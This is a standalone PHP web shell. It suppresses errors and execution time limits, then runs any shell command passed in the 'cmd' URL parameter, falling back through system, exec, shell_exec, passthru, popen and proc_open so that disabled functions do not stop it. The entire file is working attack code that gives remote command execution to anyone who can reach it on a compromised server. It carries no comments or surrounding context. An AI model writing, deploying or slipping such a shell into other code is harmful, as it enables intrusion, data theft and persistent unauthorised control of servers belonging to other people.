<?php
@error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);

if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    
    if(function_exists('system')) {
        @system($cmd);
    } elseif(function_exists('exec')) {
        @exec($cmd, $output);
        echo implode("\n", $output);
    } elseif(function_exists('shell_exec')) {
        echo @shell_exec($cmd);
    } elseif(function_exists('passthru')) {
        @passthru($cmd);
    } elseif(function_exists('popen')) {
        $proc = @popen($cmd, 'r');
        while(!@feof($proc)) { echo @fread($proc, 4096); }
        @pclose($proc);
    } elseif(function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = @proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            echo stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
    }
    exit;
}
?>
